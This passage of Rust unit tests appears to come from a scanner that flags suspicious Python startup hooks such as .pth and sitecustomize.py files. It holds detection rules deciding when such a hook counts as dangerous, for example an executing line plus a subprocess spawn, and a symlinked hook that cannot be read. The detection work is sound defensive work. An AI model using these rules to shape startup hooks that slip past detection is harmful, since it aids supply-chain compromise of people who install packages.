        let dir = tempfile::tempdir().unwrap();
        plant_startup_hook(
            dir.path(),
            "sitecustomize.py",
            b"import sys; sys.path.insert(0, \"/opt/app/plugins\")\n",
        );
        let report = scan(&installed_request(dir.path()));
        let integrity = report.integrity.as_ref().unwrap();
        // The sys.path search IS recorded as evidence.
        assert!(
            integrity.startup_signals.iter().any(|s| matches!(
                s.kind,
                crate::artifact::ArtifactSignalKind::PthSysPathSearch
            )),
            "the sys.path.insert must still record a PthSysPathSearch signal"
        );
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            !rules.contains(&RuleId::PythonStartupHookSuspicious),
            "sys.path manipulation alone must not fire the suspicious finding; got {rules:?}"
        );
    }

    #[test]
    fn startup_correlation_uses_single_danger_definition() {
        use crate::artifact::{ArtifactSignal, ArtifactSignalKind as K, EdgeConfidence};
        use crate::location::SubjectLocation;

        let loc = SubjectLocation::installed("/venv/lib/site-packages/x.pth");
        let sig = |kind: K| ArtifactSignal {
            kind,
            location: loc.clone(),
            evidence: "test".to_string(),
            confidence: EdgeConfidence::High,
        };

        // An executing line PLUS only sys.path-search / untrusted-path signals: the
        // correlation must agree with `BodyCapabilities::has_danger()` (which counts
        // neither as danger), so NO suspicious finding.
        let report = InstalledIntegrityReport {
            startup_signals: vec![
                sig(K::PthExecutableLine),
                sig(K::PthSysPathSearch),
                sig(K::PthUntrustedPathAddition),
            ],
            ..Default::default()
        };
        let no_danger_caps = crate::artifact::pth::BodyCapabilities {
            sys_path_search: true,
            ..Default::default()
        };
        assert!(
            !no_danger_caps.has_danger(),
            "sys.path search alone is not danger in the single definition"
        );
        let findings = report.startup_correlated_findings();
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::PythonStartupHookSuspicious),
            "the correlation must agree with has_danger(): sys.path/untrusted-path \
             alone is not danger; got {:?}",
            findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
        );

        // An executing line PLUS a real subprocess capability: both the single
        // definition and the correlation must treat this as danger -> suspicious.
        let report = InstalledIntegrityReport {
            startup_signals: vec![sig(K::PthExecutableLine), sig(K::PthSubprocessSpawn)],
            ..Default::default()
        };
        let danger_caps = crate::artifact::pth::BodyCapabilities {
            subprocess: true,
            ..Default::default()
        };
        assert!(danger_caps.has_danger(), "a subprocess spawn is danger");
        let findings = report.startup_correlated_findings();
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PythonStartupHookSuspicious),
            "an executing line + subprocess capability must still fire suspicious; got {:?}",
            findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
        );
    }

    #[cfg(unix)]
    #[test]
    fn unreadable_startup_hook_emits_signal() {
        use std::os::unix::fs::symlink;

        // A `.pth` planted as a SYMLINK at the final component. The no-follow read
        // (O_NOFOLLOW) refuses it as a non-regular file, so the body cannot be
        // inspected. It must NOT be treated as clean: a Low-confidence
        // `StartupHookUninspectable` signal must be recorded (T3.18). Before the
        // fix the read error returned silently with no signal.
        let dir = tempfile::tempdir().unwrap();
        let site = plant_installed_dist(
            dir.path(),
            "base",
            "1.0",
            &[("base/__init__.py", b"x = 1\n")],
            true,
            &[],
        );
        // Symlink target need not exist: O_NOFOLLOW refuses the link itself.
        symlink("/nonexistent/payload.txt", site.join("planted.pth")).unwrap();
        let report = scan(&installed_request(dir.path()));
        let integrity = report.integrity.as_ref().unwrap();
        assert!(
            integrity.startup_signals.iter().any(|s| matches!(
                s.kind,
                crate::artifact::ArtifactSignalKind::StartupHookUninspectable
            )),
            "a symlinked (unreadable) startup hook must emit the uninspectable signal; got {:?}",
            integrity
                .startup_signals
                .iter()
                .map(|s| s.kind)
                .collect::<Vec<_>>()
        );
    }
}
